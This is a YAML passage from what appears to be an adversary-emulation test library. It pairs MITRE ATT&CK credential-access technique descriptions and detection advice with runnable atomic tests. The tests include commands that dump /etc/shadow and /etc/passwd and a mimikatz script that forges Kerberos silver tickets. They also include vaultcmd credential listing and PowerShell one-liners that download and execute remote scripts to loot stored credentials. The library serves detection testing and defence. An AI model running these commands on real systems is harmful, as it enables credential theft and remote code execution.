      id: attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4
      type: attack-pattern
      created: '2020-02-11T18:46:56.263Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - url: https://attack.mitre.org/techniques/T1003/008
        external_id: T1003.008
        source_name: mitre-attack
      - description: The Linux Documentation Project. (n.d.). Linux Password and Shadow
          File Formats. Retrieved February 19, 2020.
        url: https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html
        source_name: Linux Password and Shadow File Formats
      - description: 'Vivek Gite. (2014, September 17). Linux Password Cracking: Explain
          unshadow and john Commands (John the Ripper Tool). Retrieved February 19,
          2020.'
        url: https://www.cyberciti.biz/faq/unix-linux-password-cracking-john-the-ripper/
        source_name: nixCraft - John the Ripper
      modified: '2020-03-20T15:56:55.022Z'
      name: 'OS Credential Dumping: /etc/passwd and /etc/shadow'
      description: |
        Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)

        The Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: The AuditD monitoring tool, which ships stock in many Linux
        distributions, can be used to watch for hostile processes attempting to access
        <code>/etc/passwd</code> and <code>/etc/shadow</code>, alerting on the pid,
        process name, and arguments of such programs.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'File: File Access'
      - 'Command: Command Execution'
      x_mitre_permissions_required:
      - root
      identifier: T1003.008
    atomic_tests:
    - name: Access /etc/shadow (Local)
      auto_generated_guid: 3723ab77-c546-403c-8fb4-bb577033b235
      description: "/etc/shadow file is accessed in Linux environments\n"
      supported_platforms:
      - linux
      input_arguments:
        output_file:
          description: Path where captured results will be placed
          type: path
          default: "/tmp/T1003.008.txt"
      executor:
        command: |
          sudo cat /etc/shadow > #{output_file}
          cat #{output_file}
        cleanup_command: 'rm -f #{output_file}

          '
        name: bash
        elevation_required: true
    - name: Access /etc/passwd (Local)
      auto_generated_guid: 60e860b6-8ae6-49db-ad07-5e73edd88f5d
      description: "/etc/passwd file is accessed in Linux environments\n"
      supported_platforms:
      - linux
      input_arguments:
        output_file:
          description: Path where captured results will be placed
          type: path
          default: "/tmp/T1003.008.txt"
      executor:
        command: |
          cat /etc/passwd > #{output_file}
          cat #{output_file}
        cleanup_command: 'rm -f #{output_file}

          '
        name: sh
    - name: Access /etc/{shadow,passwd} with a standard bin that's not cat
      auto_generated_guid: df1a55ae-019d-4120-bc35-94f4bc5c4b0a
      description: 'Dump /etc/passwd and /etc/shadow using ed

        '
      supported_platforms:
      - linux
      input_arguments:
        output_file:
          description: Path where captured results will be placed
          type: path
          default: "/tmp/T1003.008.txt"
      executor:
        command: 'echo -e "e /etc/passwd\n,p\ne /etc/shadow\n,p\n" | ed > #{output_file}

          '
        cleanup_command: 'rm -f #{output_file}

          '
        name: bash
        elevation_required: true
    - name: Access /etc/{shadow,passwd} with shell builtins
      auto_generated_guid: f5aa6543-6cb2-4fae-b9c2-b96e14721713
      description: 'Dump /etc/passwd and /etc/shadow using bash builtins

        '
      supported_platforms:
      - linux
      input_arguments:
        output_file:
          description: Path where captured results will be placed
          type: path
          default: "/tmp/T1003.008.txt"
      executor:
        command: |
          function testcat(){ echo "$(< $1)"; }
          testcat /etc/passwd > #{output_file}
          testcat /etc/shadow > #{output_file}
        cleanup_command: 'rm -f #{output_file}

          '
        name: bash
        elevation_required: true
  T1558.002:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--d273434a-448e-4598-8e14-607f4a0d5e27
      type: attack-pattern
      created: '2020-02-11T19:14:48.309Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1558.002
        url: https://attack.mitre.org/techniques/T1558/002
      - source_name: ADSecurity Silver Tickets
        url: https://adsecurity.org/?p=2011
        description: Sean Metcalf. (2015, November 17). How Attackers Use Kerberos
          Silver Tickets to Exploit Systems. Retrieved February 27, 2020.
      - url: https://adsecurity.org/?p=1515
        description: Metcalf, S. (2015, May 03). Detecting Forged Kerberos Ticket
          (Golden Ticket & Silver Ticket) Use in Active Directory. Retrieved December
          23, 2015.
        source_name: ADSecurity Detecting Forged Tickets
      - description: French, D. (2018, October 2). Detecting Attempts to Steal Passwords
          from Memory. Retrieved October 11, 2019.
        url: https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea
        source_name: Medium Detecting Attempts to Steal Passwords from Memory
      modified: '2020-03-25T21:46:46.831Z'
      name: 'Steal or Forge Kerberos Tickets: Silver Ticket'
      description: |-
        Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets)

        Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.(Citation: ADSecurity Detecting Forged Tickets)

        Password hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: "Monitor for anomalous Kerberos activity, such as malformed
        or blank fields in Windows logon/logoff events (Event ID 4624, 4634, 4672).(Citation:
        ADSecurity Detecting Forged Tickets) \n\nMonitor for unexpected processes
        interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords
        from Memory) Common credential dumpers such as Mimikatz access the LSA Subsystem
        Service (LSASS) process by opening the process, locating the LSA secrets key,
        and decrypting the sections in memory where credential details, including
        Kerberos tickets, are stored."
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Logon Session: Logon Session Metadata'
      x_mitre_permissions_required:
      - User
      identifier: T1558.002
    atomic_tests:
    - name: Crafting Active Directory silver tickets with mimikatz
      auto_generated_guid: 385e59aa-113e-4711-84d9-f637aef01f2c
      description: |
        Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.
        The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
      supported_platforms:
      - windows
      input_arguments:
        domain_sid:
          description: SID of the targeted domain, if you keep default it will automatically
            get the current domain SID
          type: string
          default: S-1-5-21-DEFAULT
        domain:
          description: Targeted Active Directory domain FQDN
          type: string
          default: "%userdnsdomain%"
        account:
          description: Account to impersonate
          type: string
          default: silverticketfakeuser
        target:
          description: System you want to target (Default will be logon server)
          type: string
          default: "%logonserver:\\\\=%"
        service_aes256_key:
          description: AES256 key (you will need to set to match your service key
            for your target)
          type: string
          default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
        mimikatz_path:
          description: Mimikatz windows executable
          type: path
          default: "$env:TEMP\\mimikatz\\x64\\mimikatz.exe"
      dependency_executor_name: powershell
      dependencies:
      - description: 'Mimikatz executor must exist on disk and at specified location
          (#{mimikatz_path})

          '
        prereq_command: |
          $mimikatz_path = cmd /c echo #{mimikatz_path}
          if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
        get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\"
          -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl
          = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url
          | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath
          = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\"
          $basePath\n"
      executor:
        name: powershell
        elevation_required: false
        command: "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item
          $env:TEMP\\silver.txt -ErrorAction Ignore\n\n# get current domain SID if
          default was used\n$domain_sid = \"#{domain_sid}\"\nIf ($domain_sid -Match
          \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n
          \ $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID
          = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n
          \ $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n#
          create batch file with commands to run in a separate \"runas /netonly\"
          session\n# so we don't purge Kerberos ticket from the current Windows session\n#
          its output goes to silver.txt temp file, because we cannot capture \"runas
          /netonly\" output otherwise\n@\"\n>%TEMP%\\silver.txt 2>&1 (\n  echo Purge
          existing tickets and create silver ticket:\n  klist purge\n  #{mimikatz_path}
          \"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{service_aes256_key}
          /user:#{account} /service:HOST /target:#{target}.#{domain} /ptt\" \"exit\"\n\n
          \ echo.\n  echo executing:schtasks /query /S #{target}.#{domain}\n  schtasks
          /query /S #{target}.#{domain}\n  \n  echo.\n  echo Tickets after requesting
          schtasks:\n  klist\n\n  echo.\n  echo End of Silver Ticket attack\n)\n\"@
          -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat\n\n#
          run batch file in a new empty session (password and username do not matter)\necho
          \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null\n\n#
          wait until the output file has logged the entire attack\ndo {\n  Start-Sleep
          1 # wait a bit so the output file has time to be created\n  Get-Content
          -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {\n    if ($_ -match
          'End of Silver Ticket attack') { break } \n  }\n} while ($false) # dummy
          loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content
          $env:TEMP\\silver.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\silver.bat
          -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore\n"
  T1555.004:
    technique:
      modified: '2022-10-21T15:46:55.929Z'
      name: 'Credentials from Password Stores: Windows Credential Manager'
      description: |-
        Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)

        The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.

        Credential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)

        Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)

        Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the ‚ÄúBack up...‚Ä? button on the ‚ÄúStored User Names and Passwords‚Ä? GUI.

        Password recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: |-
        Monitor process and command-line parameters of <code>vaultcmd.exe</code> for suspicious activity, such as listing credentials from the Windows Credentials locker (i.e., <code>vaultcmd /listcreds:‚ÄúWindows Credentials‚Ä?</code>).(Citation: Malwarebytes The Windows Vault)

        Consider monitoring API calls such as <code>CredEnumerateA</code> that may list credentials from the Windows Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)

        Consider monitoring file reads to Vault locations, <code>%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\</code>, for suspicious activity.(Citation: Malwarebytes The Windows Vault)
      x_mitre_platforms:
      - Windows
      x_mitre_is_subtechnique: true
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.1'
      x_mitre_contributors:
      - Bernaldo Penas Antelo
      - Mugdha Peter Bansode
      - Uriel Kosayev
      - Vadim Khrykov
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'File: File Access'
      - 'Process: OS API Execution'
      - 'Process: Process Creation'
      type: attack-pattern
      id: attack-pattern--d336b553-5da9-46ca-98a8-0b23f49fb447
      created: '2020-11-23T15:35:53.793Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1555/004
        external_id: T1555.004
      - source_name: Malwarebytes The Windows Vault
        description: Arntz, P. (2016, March 30). The Windows Vault . Retrieved November
          23, 2020.
        url: https://blog.malwarebytes.com/101/2016/01/the-windows-vaults/
      - source_name: Delpy Mimikatz Crendential Manager
        description: Delpy, B. (2017, December 12). howto ~ credential manager saved
          credentials. Retrieved November 23, 2020.
        url: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials
      - source_name: Microsoft Credential Locker
        description: Microsoft. (2013, October 23). Credential Locker Overview. Retrieved
          November 24, 2020.
        url: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-8.1-and-8/jj554668(v=ws.11)?redirectedfrom=MSDN
      - source_name: Microsoft Credential Manager store
        description: Microsoft. (2016, August 31). Cached and Stored Credentials Technical
          Overview. Retrieved November 24, 2020.
        url: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)#credential-manager-store
      - source_name: Microsoft CredEnumerate
        description: Microsoft. (2018, December 5). CredEnumarateA function (wincred.h).
          Retrieved November 24, 2020.
        url: https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratea
      - source_name: passcape Windows Vault
        description: Passcape. (n.d.). Windows Password Recovery - Vault Explorer
          and Decoder. Retrieved November 24, 2020.
        url: https://www.passcape.com/windows_password_recovery_vault_explorer
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1555.004
    atomic_tests:
    - name: Access Saved Credentials via VaultCmd
      auto_generated_guid: 9c2dd36d-5c8b-4b29-8d72-a11b0d5d7439
      description: |
        List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe
        Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos
        https://blog.malwarebytes.com/101/2016/01/the-windows-vaults/
        https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16
      supported_platforms:
      - windows
      executor:
        name: command_prompt
        elevation_required: false
        command: 'vaultcmd /listcreds:"Windows Credentials"

          '
    - name: WinPwn - Loot local Credentials - Invoke-WCMDump
      auto_generated_guid: fa714db1-63dd-479e-a58e-7b2b52ca5997
      description: Loot local Credentials - Invoke-WCMDump technique via function
        of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
          Invoke-WCMDump
        name: powershell
  T1556.001:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--d4b96d2c-1032-4b22-9235-2b5b649d0605
      type: attack-pattern
      created: '2020-02-11T19:05:02.399Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1556.001
        url: https://attack.mitre.org/techniques/T1556/001
      - source_name: Dell Skeleton
        description: Dell SecureWorks. (2015, January 12). Skeleton Key Malware Analysis.
          Retrieved April 8, 2019.
        url: https://www.secureworks.com/research/skeleton-key-malware-analysis
      - url: https://technet.microsoft.com/en-us/library/dn487457.aspx
        description: Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved
          June 3, 2016.
        source_name: TechNet Audit Policy
      modified: '2021-04-20T20:10:26.613Z'
      name: Domain Controller Authentication
      description: "Adversaries may patch the authentication process on a domain controller
        to bypass the typical authentication mechanisms and enable access to accounts.
        \n\nMalware may be used to inject false credentials into the authentication
        process on a domain controller with the intent of creating a backdoor used
        to access any user‚Äôs account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)).
        Skeleton key works through a patch on an enterprise domain controller authentication
        process (LSASS) with credentials that adversaries may use to bypass the standard
        authentication system. Once patched, an adversary can use the injected password
        to successfully authenticate as any domain user account (until the the skeleton
        key is erased from memory by a reboot of the domain controller). Authenticated
        access may enable unfettered access to hosts and/or resources within single-factor
        authentication environments.(Citation: Dell Skeleton)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      x_mitre_detection: "Monitor for calls to <code>OpenProcess</code> that can be
        used to manipulate lsass.exe running on a domain controller as well as for
        malicious modifications to functions exported from authentication-related
        system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton)\n\nConfigure
        robust, consistent account activity audit policies across the enterprise and
        with externally accessible services.(Citation: TechNet Audit Policy) Look
        for suspicious account behavior across systems that share accounts, either
        user, admin, or service accounts. Examples: one account logged into multiple
        systems simultaneously; multiple accounts logged into the same machine simultaneously;
        accounts logged in at odd times or outside of business hours. Activity may
        be from interactive login sessions or process ownership from accounts being
        used to execute binaries on a remote system as a particular account. Correlate
        other security systems with login information (e.g. a user has an active login
        session but has not entered the building or does not have VPN access). "
      x_mitre_is_subtechnique: true
      x_mitre_version: '2.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: Process Access'
      - 'Logon Session: Logon Session Creation'
      - 'File: File Modification'
      - 'Process: OS API Execution'
      x_mitre_permissions_required:
      - Administrator
    atomic_tests: []
  T1556.005:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--d50955c2-272d-4ac8-95da-10c29dda1c48
      type: attack-pattern
      created: '2022-01-13T20:02:28.349Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1556.005
        url: https://attack.mitre.org/techniques/T1556/005
      - source_name: store_pwd_rev_enc
        url: https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
        description: Microsoft. (2021, October 28). Store passwords using reversible
          encryption. Retrieved January 3, 2022.
      - source_name: how_pwd_rev_enc_1
        url: http://blog.teusink.net/2009/08/passwords-stored-using-reversible.html
        description: 'Teusink, N. (2009, August 25). Passwords stored using reversible
          encryption: how it works (part 1). Retrieved November 17, 2021.'
      - source_name: how_pwd_rev_enc_2
        url: http://blog.teusink.net/2009/08/passwords-stored-using-reversible_26.html
        description: 'Teusink, N. (2009, August 26). Passwords stored using reversible
          encryption: how it works (part 2). Retrieved November 17, 2021.'
      - source_name: dump_pwd_dcsync
        url: https://adsecurity.org/?p=2053
        description: Metcalf, S. (2015, November 22). Dump Clear-Text Passwords for
          All Admins in the Domain Using Mimikatz DCSync. Retrieved November 15, 2021.
      modified: '2022-02-10T21:35:25.377Z'
      name: Reversible Encryption
      description: |-
        An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)

        If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:

        1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>
        2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>
        3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)
        4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)

        With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)

        An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to "Windows Server 2008" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      x_mitre_detection: "Monitor property changes in Group Policy: <code>Computer
        Configuration\\Windows Settings\\Security Settings\\Account Policies\\Password
        Policy\\Store passwords using reversible encryption</code>. By default, the
        property should be set to Disabled.\n\nMonitor command-line usage for <code>-AllowReversiblePasswordEncryption
        $true</code> or other actions that could be related to malicious tampering
        of user settings (i.e. [Group Policy Modification](https://attack.mitre.org/techniques/T1484/001)).
        Furthermore, consider monitoring and/or blocking suspicious execution of Active
        Directory PowerShell modules, such as <code>Set-ADUser</code> and <code>Set-ADAccountControl</code>,
        that change account configurations. \n\nMonitor Fine-Grained Password Policies
        and regularly audit user accounts and group settings.(Citation: dump_pwd_dcsync)"
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Script: Script Execution'
      - 'Active Directory: Active Directory Object Modification'
      - 'User Account: User Account Metadata'
      - 'Command: Command Execution'
      x_mitre_permissions_required:
      - User
      - Administrator
    atomic_tests: []
  T1111:
    technique:
      modified: '2023-04-14T23:26:24.262Z'
      name: Multi-Factor Authentication Interception
      description: "Adversaries may target multi-factor authentication (MFA) mechanisms,
        (i.e., smart cards, token generators, etc.) to gain access to credentials
        that can be used to access systems, services, and network resources. Use of
        MFA is recommended and provides a higher level of security than usernames
        and passwords alone, but organizations should be aware of techniques that
        could be used to intercept and bypass these security mechanisms. \n\nIf a
        smart card is used for multi-factor authentication, then a keylogger will
        need to be used to obtain the password associated with a smart card during
        normal use. With both an inserted card and access to the smart card password,
        an adversary can connect to a network resource using the infected system to
        proxy the authentication with the inserted hardware token. (Citation: Mandiant
        M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target
        other hardware tokens, such as RSA SecurID. Capturing token input (including
        a user's personal identification code) may provide temporary access (i.e.
        replay the one-time passcode until the next value rollover) as well as possibly
        enabling adversaries to reliably predict future authentication values (given
        access to both the algorithm and any seed values used to generate appended
        temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of MFA may
        be intercepted and used by an adversary to authenticate. It is common for
        one-time codes to be sent via out-of-band communications (email, SMS). If
        the device and/or service is not secured, then it may be vulnerable to interception.
        Service providers can also be targeted: for example, an adversary may compromise
        an SMS messaging service in order to steal MFA codes sent to users‚Äô phones.(Citation:
        Okta Scatter Swine 2022)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - John Lambert, Microsoft Threat Intelligence Center
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Detecting use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior.

        Similar to [Input Capture](https://attack.mitre.org/techniques/T1056), keylogging activity can take various forms but can may be detected via installation of a driver, setting a hook, or usage of particular API calls associated with polling to intercept keystrokes.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      x_mitre_version: '2.1'
      x_mitre_data_sources:
      - 'Windows Registry: Windows Registry Key Modification'
      - 'Process: OS API Execution'
      - 'Driver: Driver Load'
      type: attack-pattern
      id: attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49
      created: '2017-05-31T21:31:23.195Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1111
        external_id: T1111
      - source_name: GCN RSA June 2011
        description: Jackson, William. (2011, June 7). RSA confirms its tokens used
          in Lockheed hack. Retrieved September 24, 2018.
        url: https://gcn.com/cybersecurity/2011/06/rsa-confirms-its-tokens-used-in-lockheed-hack/282818/
      - source_name: Mandiant M Trends 2011
        description: Mandiant. (2011, January 27). Mandiant M-Trends 2011. Retrieved
          January 10, 2016.
        url: https://dl.mandiant.com/EE/assets/PDF_MTrends_2011.pdf
      - source_name: Okta Scatter Swine 2022
        description: 'Okta. (2022, August 25). Detecting Scatter Swine: Insights into
          a Relentless Phishing Campaign. Retrieved February 24, 2023.'
        url: https://sec.okta.com/scatterswine
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1003.003:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Ed Williams, Trustwave, SpiderLabs
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24
      type: attack-pattern
      created: '2020-02-11T18:42:35.572Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1003.003
        url: https://attack.mitre.org/techniques/T1003/003
      - url: https://en.wikipedia.org/wiki/Active_Directory
        description: Wikipedia. (2018, March 10). Active Directory. Retrieved April
          11, 2018.
        source_name: Wikipedia Active Directory
      - url: http://adsecurity.org/?p=1275
        description: Metcalf, S. (2015, January 19). Attackers Can Now Use Mimikatz
          to Implant Skeleton Key on Domain Controllers & BackDoor Your Active Directory
          Forest. Retrieved February 3, 2015.
        source_name: Metcalf 2015
      modified: '2022-03-08T21:00:52.774Z'
      name: 'OS Credential Dumping: NTDS'
      description: |
        Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)

        In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)

        The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

        * Volume Shadow Copy
        * secretsdump.py
        * Using the in-built Windows tool, ntdsutil.exe
        * Invoke-NinjaCopy
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: Monitor processes and command-line arguments for program
        execution that may be indicative of credential dumping, especially attempts
        to access or copy the NTDS.dit.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'File: File Access'
      x_mitre_permissions_required:
      - Administrator
      x_mitre_system_requirements:
      - Access to Domain Controller or backup
      identifier: T1003.003
    atomic_tests:
    - name: Create Volume Shadow Copy with vssadmin
      auto_generated_guid: dcebead7-6c28-4b4b-bf3c-79deb1b1fc7f
      description: |
        This test is intended to be run on a domain Controller.

